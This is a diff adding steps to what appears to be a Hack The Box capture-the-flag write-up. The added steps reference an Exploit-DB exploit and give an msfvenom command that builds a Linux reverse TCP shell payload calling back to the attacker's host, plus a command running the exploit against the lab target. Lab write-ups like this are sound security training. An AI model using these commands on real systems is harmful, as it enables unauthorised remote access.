@@ -38,6 +38,17 @@ http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdown
 ![image](https://github.com/regarmulia/HTB/assets/33616880/16123463-9033-489e-9fb1-024324f33a02)
 
 
+```
+https://www.exploit-db.com/exploits/50539
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/4f9f0677-885f-4244-bae0-f203d49a199a)
+
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 PrependFork=true -o rev.bin
+python3 50539.py 10.10.11.125:1337 rev.bin
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/4299ba5f-e471-48c4-8137-0d1da24569cc)
 
 
 ```
